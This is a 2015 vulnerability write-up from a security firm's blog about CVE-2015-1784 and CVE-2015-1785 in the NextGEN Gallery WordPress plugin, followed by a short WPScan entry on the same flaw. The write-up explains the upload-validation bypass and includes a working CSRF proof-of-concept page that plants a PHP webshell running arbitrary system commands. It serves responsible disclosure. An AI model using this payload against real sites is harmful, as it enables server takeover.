=== Content from blog.nettitude.com_3fce8cc7_20250126_010944.html ===


[Skip content](#content)

Global (English)

* [About us](/en/who-we-are/)
* [Client login](/en/client-portal/)
* [⚠️ Report a Cyber Incident](/en/emergency-incident-response-services/)
* [Contact us](/en/contact-us/)

[Logo](/en/)

Menu

Close

* Assurance 4.0

  + Back
  + [Assurance 4.0](/en/who-we-are/assurance-4/)
  + [Assure Assets and Management Systems](/en/assure-assets-and-management-systems/)
  + [Achieve Product Integrity](/en/achieve-product-integrity/)
  + [Source Responsibly](/en/source-responsibly/)
  + [Navigate the Energy Transition and Achieve Net Zero](/en/navigate-the-energy-transition-and-achieve-net-zero/)
  + [Strengthen Cyber Security Maturity](/en/strengthen-cybersecurity-maturity/)
* Sectors

  + Back
  + [Sectors](/en/sectors/)
  + [Food and Beverage](/en/food-beverage-hospitality/)
  + [Financial and Professional Services](/en/financial-and-professional-services/)
  + [Energy and Renewables](/en/energy-renewables/)
  + [Transportation and Mobility](/en/transport-logistics/)
  + [Technology and Telecommunications](/en/ict-telecoms/)
  + [Consumer Goods and Retail](/en/consumer-goods-and-retail/)
  + [Construction and Engineering](/en/construction-industry/)
  + [Healthcare and Medical](/en/healthcare-medical/)
  + [Can't see your sector?](/en/contact-us/)
* Services

  + Back
  + [Services](/en/services/)
  + Assessment and Certification

    - Back
    - [Assessment and Certification](/en/assessment-certification/)
    - [Transfer your Certification to LRQA](/en/transfer-certification-to-lrqa/)
    - Quality, Environment, Health and Safety

      * Back
      * [Quality, Environment, Health and Safety](/en/quality-health-and-safety-and-environmental/)
      * [ISO 9001 Certification](/en/iso-9001/)
      * [ISO 14001 Certification](/en/iso-14001/)
      * [ISO 45001 Certification](/en/iso-45001/)
    - Food and Beverage

      * Back
      * [Food and Beverage](/en/food-beverage-hospitality/)
      * [FSSC 22000 Certification](/en/fssc-22000/)
      * [BRCGS Certification](/en/brcgs-food-safety/)
      * [2nd Party Audits](/en/2nd-party-audit-programmes/)
      * [ISO 22000 Certification](/en/iso-22000/)
      * [IFS Certification](/en/ifs/)
      * [SQF Certification](/en/sqf-certification/)
      * [HACCP Certification](/en/haccp/)
      * [Food Labelling](/en/food-labelling-regulation-advisory-services/)
      * [GSA BAP Certification](/en/gsa-bap/)
      * [MSC Certification](/en/msc/)
      * [ASC Certification](/en/asc/)
    - Sustainability and Responsible Sourcing

      * Back
      * [Sustainability and Responsible Sourcing](/en/climate-change-sustainability/)
      * [ISO 14064 Certification](/en/iso-14064/)
      * [ISO 50001 Certification](/en/iso-50001/)
      * [ISO 46001 Certification](/en/iso-46001/)
      * [Sedex Members Ethical Trade Audit (SMETA)](/en/smeta/)
      * [Amfori BSCI](/en/amfori-bsci-business-social-compliance-initiative/)
      * [Farm First](/en/farm-first-assurance-scheme/)
      * [ERSA](/en/ersa-responsible-sourcing-assessment/)
      * [Social and Labour Convergence Programme (SLCP)](/en/social-labour-convergence-program-slcp/)
      * [Initiative for Compliance and Sustainability (ICS)](/en/initiative-for-compliance-and-sustainability/)
      * [Responsible Business Alliance - Validated Assessment Program (RBA-VAP)](/en/rba-vap-validated-assessment-program/)
      * [Worldwide Responsible Accredited Production (WRAP)](/en/worldwide-responsible-accredited-production/)
      * [EU ETS](/en/eu-ets/)
      * [Responsible Plastic Management](/en/responsible-plastic-management/)
    - Information Security Management

      * Back
      * [Information Security Management](/en/information-security-management/)
      * [ISO 27001 Certification](/en/iso-27001/)
      * [ISO 27701 Certification](/en/iso-27701/)
      * [ISO 20000-1 Certification](/en/iso-20000/)
      * [ISO 22301 Certification](/en/iso-22301/)
      * [CSA STAR Certification](/en/csa-star/)
      * [ISO 42001 Certification](/en/iso-42001-ai-management-system-certification/)
    - Automotive and Aerospace

      * Back
      * [Automotive and Aerospace](/en/automotive-aerospace/)
      * [IATF 16949 Certification](/en/iatf-16949/)
      * [AS 9100 Certification](/en/as9100/)
    - [Medical - ISO 13485 Certification](/en/iso-13485/)
    - [Oil and Gas - ISO 29001 Certification](/en/iso-29001/)
    - [Client-Specific Programmes](/en/client-specific-programmes/)
    - [LRQA Worker Surveys](/en/lrqa-worker-surveys/)
  + Inspection Services

    - Back
    - [Inspection Services](/en/inspection-services/)
    - Product, System and Process Certification

      * Back
      * [Product, System and Process Certification](/en/codes-standards-regulations/)
      * [ASME](/en/asme-code-services/)
      * [Pressure Equipment Directive (PED)](/en/pressure-equipment-directive/)
      * [National Approvals](/en/product-certification/national-approvals/)
      * [EU Directives](/en/product-certification/ce-marking-and-eu-directives/)
    - Welding and Material Services

      * Back
      * [Welding and Material Services](/en/materials-and-welding/)
      * [EN 10204 Type 3.2](/en/materials-and-welding/en-10204-type-3-2-certification-services/)
      * [ISO 3834 Certification](/en/materials-and-welding/iso-3834/)
      * [Welding Procedure and Welder Operator Qualification](/en/materials-and-welding/welding-operator-qualification/)
    - [Container Certification](/en/containers/)
    - [Type Approval](/en/product-certification/type-approval/)
    - [Utilities Schemes](/en/utilities/)
    - Construction Scheme

      * Back
      * [Construction Scheme](/en/construction-industry/)
      * [BIM and ISO 19650](/en/construction-industry/building-information-modelling-bim/)
      * [BOPAS](/en/construction-industry/buildoffsite-property-assurance-scheme-bopas/)
      * [Construction Products Regulation (CPR)](/en/construction-products-regulation/)
    - Energy Transition Services

      * Back
      * [Energy Transition Services](/en/energy-transition-services/)
      * [Hydrogen Projects](/en/hydrogen-net-zero-manufacturing/)
      * [Nuclear Projects](/en/nuclear-supply-chain-inspection/)
      * [Solar Projects](/en/solar-projects-assurance/)
      * [Wind Projects](/en/wind-projects-assurance/)
    - Technical Advisory

      * Back
      * Technical Advisory
      * [Additive Manufacturing](/en/additive-manufacturing/)
      * [Other Technical Advisory Services](/en/technical-advisory-services/)
    - Supply Chain and Vendor Inspection

      * Back
      * [Supply Chain and Vendor Inspection](/en/supply-chain-inspection/)
      * [Cranes and Lifting Equipment](/en/manufacturing-industry/cranes-lifting-equipment/)
    - [Remote Inspection](/en/remote-inspection/)
  + Cyber Security Services

    - Back
    - [Cyber Security Services](/en/cyber-security-services/)
    - [⚠️ Report a Cyber Incident](/en/emergency-incident-response-services/)
    - Cyber Advisory

      * Back
      * [Cyber Advisory](/en/cyber-security-advisory-services/)
      * [Threat Intelligence Services](/en/threat-intelligence-services/)
      * [Virtual CISO Services](/en/virtual-ciso/)
      * [ThreatWatcher](/en/threatwatcher/)
      * [Threat Modelling](/en/threat-modelling/)
      * [Regulatory Compliance Testing](/en/regulatory-compliance-testing/)
      * [Red Teaming](/en/red-teaming/)
      * [Purple Teaming](/en/purple-teaming/)
      * [Cyber Security Maturity Assessment](/en/cyber-security-maturity-assessment/)
      * [Merger and Aquisitions Due Diligence](/en/mergers-and-acquisition-due-diligence/)
      * [Offensive Cyber Security Training](/en/offensive-cyber-security-training/)
    - Governance, Risk and Compliance

      * Back
      * [Governance, Risk and Compliance](/en/governance-risk-compliance-services/)
      * [PCI DSS Consultancy and Assessments](/en/pci-dss-assessments/)
      * [Security Awareness Training](/en/security-awareness-training/)
      * [DORA Compliance](/en/dora-compliance/)
      * [ISO 27001 Certification](/en/iso-27001/)
      * [NIST Cyber Security Framework](/en/nist-cyber-security-framework/)
      * [NCSC 10 Steps to Cyber Security](/en/ncsc-ten-steps-to-cyber-security-assessment/)
      * [CAA ASSURE Cyber Audit](/en/caa-assure-cyber-audit/)
      * [Vendor Security Review](/en/vendor-security-review/)
      * [Policies Procedures Creation and Review](/en/policies-procedures-creation-review/)
      * [Cyber Essentials Certification](/en/cyber-essentials-certification/)
      * [Cyber Security Risk Assessment](/en/cyber-security-risk-assessment/)
      * [Cloud Security and Privacy](/en/information-security-management/)
      * [CMMC Compliance](/en/cmmc-compliance/)
    - Managed Cyber Security Services

      * Back
      * [Managed Cyber Security Services](/en/managed-security-services/)
      * [SOC-as-a-Service (SOCaaS)](/en/soc-as-a-service/)
      * [Network Detection and Response (NDR)](/en/network-detection-and-response/)
      * [Extended Detection and Response (XDR)](/en/extended-detection-and-response/)
      * [Managed Detection and Response (MDR)](/en/managed-detection-and-response/)
      * [Security Information and Event Management (SIEM)](/en/security-information-and-event-management-siem-services/)
      * [Endpoint Detection and Response (EDR)](/en/endpoint-detection-and-response/)
      * [Virtual CISO Services](/en/virtual-ciso/)
      * [Digital Forensics and Incident Response](/en/digital-forensics-and-incident-response/)
      * [Vulnerability Scanning](/en/managed-vulnerability-scanning/)
    - Incident Response

      * Back
      * [Incident Response](/en/incident-response-services/)
      * [Digital Forensics and Incident Response](/en/digital-forensics-and-incident-response/)
      * [Emergency Incident Response](/en/emergency-incident-response-services/)
    - Cyber Security Testing

      * Back
      * [Cyber Security Testing](/en/cyber-security-testing/)
      * [Penetration Testing Services](/en/penetration-testing/)
      * [Web Application Penetration Testing](/en/web-application-penetration-testing/)
      * [Mobile Application Penetration Testing](/en/mobile-application-penetration-testing/)
      * [Cloud Penetration Testing](/en/cloud-penetration-testing/)
      * [Continuous Assurance](/en/continuous-assurance/)
      * [Red Teaming](/en/red-teaming/)
      * [Purple Teaming](/en/purple-teaming/)
      * [Social Engineering](/en/social-engineering/)
      * [Bug Bounty Program](/en/bug-bounty-program/)
    - Cyber Insurance Services

      * Back
      * Cyber Insurance Services
      * [Cyber Insurance Partner](/en/cyber-insurance-service-partner/)
      * [Cyber Insurance](/en/cyber-insurance-services/)
  + Verification and Report Assurance

    - Back
    - [Verification and Report Assurance](/en/assurance-services/)
    - [CSRD](/en/csrd/)
    - [Organisational GHG and Carbon Verification](/en/organisational-ghg-carbon-verification/)
    - [Environmental and Social Verification](/en/environmental-social-verification/)
    - [Product Carbon Footprinting](/en/product-carbon-footprinting/)
    - [Carbon Neutrality](/en/carbon-neutrality/)
    - [Regulatory Emission Schemes](/en/regulatory-emission-schemes/)
    - [Sector Carbon Standards](/en/sector-carbon-standards/)
  + Training

    - Back
    - Training
    - All Training Courses

      * Back
      * [All Training Courses](/en/training/overview/)
      * [Quality, Environment, Health and Safety Training](/en/training/quality-environmental-health-and-safety/)
      * [Food, Beverage and Hospitality Training](/en/training/food-beverage-hospitality/)
      * [Medical Devices Training](/en/training/medical-devices/)
      * [Cybersecurity and Information Security Training](/en/training/infosecurity-cyber/)
      * [Climate Change and Sustainability Training](/en/training/climate-change-sustainability/)
      * [Automotive, Aerospace and Transport Training](/en/training/automotive-aerospace/)
      * [Manufacturing Codes and Standards Training](/en/training/manufacturing/)
    - Online Training

      * Back
      * [Online Training](/en/training/virtual-classroom-online-courses/)
      * [Virtual Classroom Courses](/en/training/virtual-classroom-courses/)
      * [eLearning](/en/training/elearning-courses/)
      * [Blended Training](/en/training/blended/)
    - [LRQA Training Academy](/en/training-academy/)
    - [Management System Solutions](/en/management-system-solutions/)
    - [Training Portal](https://training-portal.lrqa.com/lmt/clmsbrowsev2.prmain?site=lrqaext&in_lang=en&in_region=gl)
  + Advisory Services

    - Back
    - [Advisory Services](/en/advisory-services/)
    - [ESG Advisory](/en/esg-advisory/)
    - [CSDDD](/en/csddd/)
    - [CSRD](/en/csrd/)
    - Diagnostics

      * Back
      * [Diagnostics](/en/diagnostics/)
      * [Responsible Sourcing](/en/responsible-sourcing-in-supply-chains/)
      * [Human Rights Impact Assessment (HRIA)](/en/human-rights-impact-assessment/)
      * [Net Zero](/en/net-zero-climate-risk-service/)
      * [Double Materiality](/en/double-materiality-assessment/)
    - Strategy and Design

      * Back
      * [Strategy and Design](/en/strategy-and-design/)
      * [Supply Chain Risk Assessment and Segmentation](/en/supply-chain-risk-assessment-segmentation-service/)
      * [Carbon Footprint and Decarbonisation Strategy](/en/corporate-decarbonisation-strategy/)
      * [Safety Culture Ladder](/en/safety-culture-ladder/)
    - Implementation

      * Back
      * [Implementation](/en/implementation/)
      * [Grievance Mechanism](/en/grievance-mechanism/)
      * [GHG Inventory](/en/ghg-inventory-service/)
      * [Waste and Emissions Supply Chain Engagement](/en/waste-and-emissions-supply-chain-engagement/)
    - Reporting and Disclosure

      * Back
      * [Reporting and Disclosure](/en/reporting-and-disclosure/)
      * [Climate Disclosure](/en/climate-disclosure-service/)
      * [Sustainability Disclosure](/en/sustainability-disclosure/)
    - [Programme Management](/en/programme-management/)
    - [Technical Advisory](/en/technical-advisory-services/)
    - Training

      * Back
      * Training
      * [All Training Courses](/en/training/overview/)
      * [Online Training](/en/training/virtual-classroom-online-courses/)
      * [Management System Solutions](/en/management-system-solutions/)
      * [Training Portal](https://training-portal.lrqa.com/lmt/clmsbrowsev2.prmain?site=lrqaext&in_lang=en&in_region=gl)
    - [Management System Solutions](/en/management-system-solutions/)
    - [LRQA Worker Surveys](/en/lrqa-worker-surveys/)
  + Data and Analytics

    - Back
    - Data and Analytics
    - [LRQA's EiQ Platform](https://www.eiq.ai/)
    - [EiQ Lite](/en/eiq-lite/)
  + [Can't find the service you need?](/en/contact-us/)
* News and Insights

  + Back
  + News and Insights
  + [Latest News](/en/latest-news/)
  + [Thought Leadership Articles](/en/insights/articles/)
  + [Cyber Labs](/en/cyber-labs/)
  + [Case Studies](/en/case-studies/)
  + [Podcasts](/en/podcasts/)
  + [Downloadable Resources](/en/resources/)
  + [Legislation Map](/en/supply-chain-due-diligence-legislation-map/)
  + [Client Information Notes (CINs)](/en/resources/client-information-note/)
  + [Accreditations](/en/who-we-are/our-management-systems-accreditations/)
  + [Hall of fame](/nl-nl/case-studies/hall-of-fame/)
  + [Awards and Recognition](/en/who-we-are/awards-and-recognition/)
* [Events and Webinars](/en/events/)
* Careers

  + Back
  + [Careers](/en/careers/)
  + [What it's like to work here](/en/why-lrqa/)
  + [From application to onboarding](/en/career-faqs/)
  + Talent Community

    - Back
    - [Talent Community](/en/opportunities/)
    - [Assessment roles](/en/opportunities/assessment-roles/)
    - [Inspection Service roles](/en/opportunities/inspection-service-roles/)
    - [Cybersecurity roles](/en/opportunities/cybersecurity-roles/)
    - [Advisory and ESG roles](/en/opportunities/advisory-and-esg-roles/)
    - [Sales and Business Development roles](/en/opportunities/sales-roles/)
    - [Contractor roles](/en/opportunities/contractor-roles/)
    - [Corporate Function roles](/en/opportunities/corporate-function-roles/)
  + Apply now

    - Back
    - Apply now
    - [Advisory and ESG roles](https://elevatelimited.bamboohr.com/careers)
    - [All other roles](https://jobs.lrqa.com/)
* [About us](/en/who-we-are/)
* [Client login](/en/client-portal/)
* [⚠️ Report a Cyber Incident](/en/emergency-incident-response-services/)

Search

Close

Search form
Search open

Search

Are you looking for?

* [Events](/en/events/)
* [News](/en/latest-news/)
* [Case studies](/en/case-studies/)
* [Resource library](/en/resources/)
* [Client Portal](/en/client-portal/)
* [Client Information Notes](/en/resources/client-information-note/)

You are here:

1. [Home](/en/)
2. [Insights](/en/insights/)
3. [Articles

   Back to previous page](/en/insights/articles/)
4. **CSRF and unsafe arbitrary file upload in nextgen gallery plugin (2.0.77.0) for Wordpress**

![](/static/assets/search-grey.svg)
# CSRF and unsafe arbitrary file upload in nextgen gallery plugin (2.0.77.0) for Wordpress

###

### **Subscribe** to our newsletter

Stay ahead with the latest news and insights that matter to your business.

[Sign up](/en/sign-up-newsletters/?epslanguage=en "Sign up")

#### 1      Introduction

Please note the vulnerability detailed in this blog article was first discovered on Monday 9th March 2015, disclosed and discussed with the company concerned on March 10th and a [patch](https://wordpress.org/plugins/nextgen-gallery/) was released on March 12th.

**1.1    Versions and CVE**

* Currently tested on NextGEN Gallery >=2.0.77.0 and WordPress 4.1.1
* CVE-2015-1784 NextGEN Gallery WordPress: file upload bypass
* CVE-2015-1785 NextGEN Gallery WordPress: CSRF

**1.2    Abstract**

The NextGEN Gallery plugin for WordPress is the sixth most popular plugin used to date, with over 12 Million users and 100+ extensions.

There are two vulnerabilities which can allow an attacker to gain full access over the web application. The vulnerabilities lie in how the application validates user uploaded files and lack of security measures preventing unwanted HTTP requests.

An average of 20% (2.4 million) of these installs will allow for lower level users (editors and subscribers etc.) to perform image uploads. Some of the extensions provided for the NextGEN Gallery allow for Public file uploading. Around 100,000 users have this extension according to the WordPress app store.

This means that 12 million are vulnerable to CSRF with a webshell, 2.4 million vulnerable to webshell through unsafe file upload and 100,000 vulnerable to unauthenticated unsafe file upload.

**1.3    What is Arbitrary File Upload?**

Files that can be uploaded to the server can represent a significant risk. The majority of attacks involve getting code onto the server to be attacked, after that the code only needs to be executed. File uploads help an attacker get code onto the server.

The consequences of an unsafe file upload can lead to complete system takeover, access to databases and defacement. It varies on how the server handles uploads, where the files are stored and what the application does.

**1.4    What is Cross-Site Request Forgery (CSRF)?**

Cross-Site Request Forgery is an attack that causes a user’s web browser to perform an unwanted action on a trusted site where a user is currently authenticated. CSRF attacks abuse state changes instead of theft of data or remote code execution as the attacker has no way to see the response of the request.

A CSRF Attack, for example, can force a user into changing their password, transferring funds and in the case of the vulnerabilities talked about in this article, compromise the entire application.

#### 2      Bypassing the upload validation

NextGEN Gallery by default only allows administrators to upload images to the server, however you can allow lower level users such as editors or subscribers to upload images opening a larger attack vector. If a lower level user was given access to the upload function then this could be used in a privilege escalation type attack to gain web shell on the server. In the example below I will show an unsafe file upload leading to webshell via an editor level account.

 Figure 1 - Upload Section

In the above figure we can see that the file “simpleshell.jpg” has been loaded into the uploader. The file contains a very basic PHP shell. Renaming the extension from .php to .jpg allows us to bypass the first line of defense in the NextGEN plugin, which is by using client side file validation to ensure the file has a valid image extension such as JPG.

After the file has been loaded we need to intercept the request and edit a few parameters to bypass the server side validation of the file.

 Figure 2 - Original Request

The server side validation checks for file extension, content-type and performs basic file analysis scanning for image headers. As seen in the figure above the request contains a very basic PHP web shell that is passed as an image.

In our edited request below you can see that to bypass the file extension validation “.php” has been appended to the end of the “simpleshell.jpg” file, thus turning this file back into a valid PHP file. The content-type was already stated as “image/jpeg” so that’s fine. Finally, to work around the file analysis a header from a valid JPEG file has been inserted above the PHP script to trick the application into thinking that this is a valid image file.

 Figure 3 - Edited Request

When the request is submitted we are passed an upload message stating that “1 image Upload complete”.

By default, the file path naming convention for NextGEN gallery is as follows: “/wp-content/gallery/[name of gallery]/[name of file]” This path is publically available and viewable as an unauthenticated user.

 Figure 4 - Webshell gained

After browsing to the file and passing the “id” command to the “cmd” parameter the output is displayed on the page, confirming the PHP webshell is working. From this point it is possible to call system commands and invoke reverse shells etc.

#### 3      Cross-site request forgery abusing unsafe file upload

Using the techniques previously stated to bypass the file upload validation it is possible to create a CSRF proof of concept (PoC). The NextGEN gallery does not implement a unique token or nonce to protect against CSRF in the file upload page allowing for unwanted HTTP requests to be made to the authenticated application by the user unknowingly via a malicious link or XSS.

The figure below illustrates the PoC file, we can see that the gallery ID that this webshell will be uploaded to is “youhascsrf” and that the file name will be “shell.jpg.php”. The techniques used to bypass the upload validation demonstrated previously were also used in this PoC.

[cpp]</p>
<p>&lt;html&gt;</p>
<p>&lt;body&gt;</p>
<p>&lt;strong&gt;   &lt;/strong&gt;&lt;script&gt;</p>
<p>&lt;strong&gt;&lt;em&gt;function&lt;/em&gt;&lt;/strong&gt; submitRequest&lt;strong&gt;()&lt;/strong&gt;</p>
<p>&lt;strong&gt;{&lt;/strong&gt;</p>
<p>&lt;strong&gt;&lt;em&gt;var&lt;/em&gt;&lt;/strong&gt; xhr &lt;strong&gt;=&lt;/strong&gt; &lt;strong&gt;&lt;em&gt;new&lt;/em&gt;&lt;/strong&gt; XMLHttpRequest&lt;strong&gt;();&lt;/strong&gt;</p>
<p>xhr.open&lt;strong&gt;(&lt;/strong&gt;&quot;POST&quot;&lt;strong&gt;,&lt;/strong&gt; &quot;http://127.0.0.1/wordpress/?photocrati\_ajax=1&amp;action=upload\_image&amp;gallery\_id=0&amp;gallery\_name=youhascsrf&quot;&lt;strong&gt;,&lt;/strong&gt; &lt;strong&gt;&lt;em&gt;true&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;);&lt;/strong&gt;</p>
<p>xhr.setRequestHeader&lt;strong&gt;(&lt;/strong&gt;&quot;Accept&quot;&lt;strong&gt;,&lt;/strong&gt; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8&quot;&lt;strong&gt;);&lt;/strong&gt;</p>
<p>xhr.setRequestHeader&lt;strong&gt;(&lt;/strong&gt;&quot;Accept-Language&quot;&lt;strong&gt;,&lt;/strong&gt; &quot;en-US,en;q=0.5&quot;&lt;strong&gt;);&lt;/strong&gt;</p>
<p>xhr.setRequestHeader&lt;strong&gt;(&lt;/strong&gt;&quot;Content-Type&quot;&lt;strong&gt;,&lt;/strong&gt; &quot;multipart/form-data; boundary=---------------------------11451489371866854212008584&quot;&lt;strong&gt;);&lt;/strong&gt;</p>
<p>xhr.withCredentials &lt;strong&gt;=&lt;/strong&gt; &lt;strong&gt;&lt;em&gt;true&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;;&lt;/strong&gt;</p>
<p>&lt;strong&gt;&lt;em&gt;var&lt;/em&gt;&lt;/strong&gt; body &lt;strong&gt;=&lt;/strong&gt; &quot;-----------------------------11451489371866854212008584rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;Content-Disposition: form-data; name=&quot;name&quot;rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;shell.jpgrn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;-----------------------------11451489371866854212008584rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.jpg.php&quot;rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;Content-Type: image/jpegrn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;xffxd8xffxe0x00x10JFIFx00x01x02x00x00x01x00x01x00x00xffxfex00x04\*x00xffxe2x02x1cICC\_PROFILEx00x01x01x00x00x02x0clcmsx02x10x00x00mntrRGB XYZ x07xdcx00x01x00x19x00x03x00)x009acspAPPLx00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00xf6xd6x00x01x00x00x00x00xd3-</p>
<p>lcmsx00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;descx00x00x00xfcx00x00x00^cprtx00x00x01\x00x00x00x0bwtptx00x00x01hx00x00x00x14bkptx00x00x01|x00x00x00x14rXYZx00x00x01x90x00x00x00x14gXYZx00x00x01xa4x00x00x00x14bXYZx00x00x01xb8x00x00x00x14rTRCx00x00x01xccx00x00x00@gTRCx00x00x01xccx00x00x00@bTRCx00x00x01xccx00x00x00@descx00x00x00x00x00x00x00x03c2x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00textx00x00x00x00FBx00x00XYZ x00x00x00x00x00x00xf6xd6x00x01x00x00x00x00xd3-XYZ x00x00x00x00x00x00x03x16x00x00x033x00x00x02xa4XYZ x00x00x00x00x00x00oxa2x00x008xf5x00x00x03x90XYZ x00x00x00x00x00x00bx99x00x00xb7x85x00x00x18xdaXYZ x00x00x00x00x00x00$xa0x00x00x0fx84x00x00xb6xcfcurvx00x00x00x00x00x00x00x1ax00x00x00xcbx01xc9x03cx05x92x08kx0bxf6x10?x15Qx1b4!xf1)x902x18;x92Fx05Qw]xedkpzx05x89xb1x9a|xacixbf}xd3xc3xe90xffxffxffxdbx00Cx00x04x03x03x04x03x03x04x04x03x04x05x04x04x05x06rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;x3c?phprn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;if(isset($\_REQUEST['cmd'])){rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;   $cmd = ($\_REQUEST[&quot;cmd&quot;]);rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;   system($cmd);rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;   echo &quot;x3c/prex3e$cmdx3cprex3e&quot;;rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;   die;rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;}rn&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;?x3ern&quot; &lt;strong&gt;+&lt;/strong&gt;</p>
<p>&quot;-----------------------------11451489371866854212008584--rn&quot;&lt;strong&gt;;&lt;/strong&gt;</p>
<p>&lt;strong&gt;&lt;em&gt;var&lt;/em&gt;&lt;/strong&gt; aBody &lt;strong&gt;=&lt;/strong&gt; &lt;strong&gt;&lt;em&gt;new&lt;/em&gt;&lt;/strong&gt; Uint8Array&lt;strong&gt;(&lt;/strong&gt;body.length&lt;strong&gt;);&lt;/strong&gt;</p>
<p>&lt;strong&gt;&lt;em&gt;for&lt;/em&gt;&lt;/strong&gt; &lt;strong&gt;(&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;var&lt;/em&gt;&lt;/strong&gt; i &lt;strong&gt;=&lt;/strong&gt; 0&lt;strong&gt;;&lt;/strong&gt; i &lt;strong&gt;&lt;&lt;/strong&gt; aBody.length&lt;strong&gt;;&lt;/strong&gt; i&lt;strong&gt;++)&lt;/strong&gt;</p>
<p>aBody&lt;strong&gt;[&lt;/strong&gt;i&lt;strong&gt;]&lt;/strong&gt; &lt;strong&gt;=&lt;/strong&gt; body.charCodeAt&lt;strong&gt;(&lt;/strong&gt;i&lt;strong&gt;);&lt;/strong&gt;</p>
<p>xhr.send&lt;strong&gt;(&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;new&lt;/em&gt;&lt;/strong&gt; Blob&lt;strong&gt;([&lt;/strong&gt;aBody&lt;strong&gt;]));&lt;/strong&gt;</p>
<p>&lt;strong&gt;}&lt;/strong&gt;</p>
<p>&lt;/script&gt;</p>
<p>&lt;strong&gt;   &lt;/strong&gt;&lt;form action=&lt;strong&gt;&quot;#&quot;&lt;/strong&gt;&gt;</p>
<p>&lt;strong&gt;     &lt;/strong&gt;&lt;input type=&lt;strong&gt;&quot;button&quot;&lt;/strong&gt; value=&lt;strong&gt;&quot;Submit request&quot;&lt;/strong&gt; onclick=&lt;strong&gt;&quot;submitRequest();&quot;&lt;/strong&gt; /&gt;</p>
<p>&lt;strong&gt;   &lt;/strong&gt;&lt;/form&gt;</p>
<p>&lt;/body&gt;</p>
<p>&lt;/html&gt;</p>
<p>[/cpp]

If this file was hosted externally and an administrator (or any other user with upload rights) clicked the link and submitted this request then the webshell would be uploaded to the file path “/wp-content/gallery/youhascsrf/shell.jpg.php” and then be publically available without the user’s knowledge. In the figure below, we can see that an admin is logged into a WordPress installation with the NextGEN Gallery plugin activated.

 Figure 5 - Admin WordPress dash

As we can see there are currently no galleries present on this application.

 Figure 6 - No Galleries

 Figure 7- CSRF PoC loaded in browser

As this is just a PoC, the attack will trigger when the “submit request” button is clicked, however, in a real world situation this request would be submitted asynchronously without the users’ knowledge. After clicking the “submit request” button we can now see that the gallery has been created and the webshell is present.

 Figure 8 - Webshell now present

In the figure below the “Id” command is send to the webshell and we have system access.

 Figure 9 - System commands executed

![](/cdn-cgi/image/width=120,format=auto/globalassets/logos/lrqa-white-logo---dark-background-cropped.png)

* [![](/cdn-cgi/image/width=20,format=auto/globalassets/_shared-images/twitter2.png)](https://twitter.com/lrqa)
* [![LinkedIn icon in mint green](/cdn-cgi/image/width=20,format=auto/globalassets/_shared-images/linkedin-icon-1.png)](https://www.linkedin.com/company/lrqa)

* [Who we are](/en/who-we-are/)
* [Careers](/en/careers/)
* [Resources](/en/resources/)

LRQA and any variants are trading names of LRQA Group Limited, its subsidiaries and affiliates. LRQA Group Limited, registered number 1217474, is a limited company registered in England and Wales. Registered office: 1, Trinity Park, Bickenhill Lane, Birmingham B37 7ES. © 2024 LRQA Group Limited.

* [Privacy notice](/en/privacy-notice/)
* [Cookie Policy](/en/cookies-policy/)
* [Terms of use](/en/terms-of-use/)
* [Modern Slavery Statement](/en/who-we-are/modern-slavery/)
* [Governance](/en/who-we-are/governance-policies/)



=== Content from wpscan.com_ed791c68_20250124_124453.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# NextGEN Gallery < 2.0.77.3 - CSRF & Arbitrary File Upload

### Description

There are two vulnerabilities which can allow an attacker to gain full access over the web application. The vulnerabilities lie in how the application validates user uploaded files and lack of security measures preventing unwanted HTTP requests.

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

